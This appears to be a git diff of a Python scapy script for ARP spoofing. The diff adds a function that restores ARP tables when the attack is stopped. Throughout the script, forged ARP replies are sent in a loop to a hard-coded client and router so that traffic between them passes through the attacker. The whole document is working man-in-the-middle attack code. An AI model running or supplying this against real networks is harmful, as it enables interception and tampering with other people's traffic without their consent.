@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-
 import scapy.all as scapy
 import time
 
@@ -19,12 +18,20 @@ def spoofing(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 # Restoring ARP tables
-def arp_restore:
-    
-# To initialize the number of packets send
-packet_count = 0
+def arp_restore(destination_ip, source_ip):
+    destination_mac = fetch_mac_address(destination_ip)
+    source_mac = fetch_mac_address(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False) # will send packet 4 times to make sure to correct arp table
+
+# Taking user input
+
+
+
 # To continue the spoofing packets
 try:
+    # To initialize the number of packets send
+    packet_count = 0
     while True:
         spoofing("192.168.100.37", "192.168.100.1") # will spoof the client by telling that i am the router
         spoofing("192.168.100.1", "192.168.100.37") # will spoof the router by telling i am the client
@@ -32,8 +39,11 @@ try:
         print("\r[+] Packet Sent Successfully: " + str(packet_count), end=""),
         time.sleep(2) # will sleep for 2 sec. In order to not send to many packets
 except KeyboardInterrupt:
-    print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Quiting")
+    print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Resetting ARP tables ...... Please Wait")
+    arp_restore("192.168.100.37", "192.168.100.1")
 
 # Use the below functions in case if it doesn't work using the end function in line 28 via python3
 # sys.stdout.flush()
 # import sys
+# print(packet.show())
+# print(packet.summary())
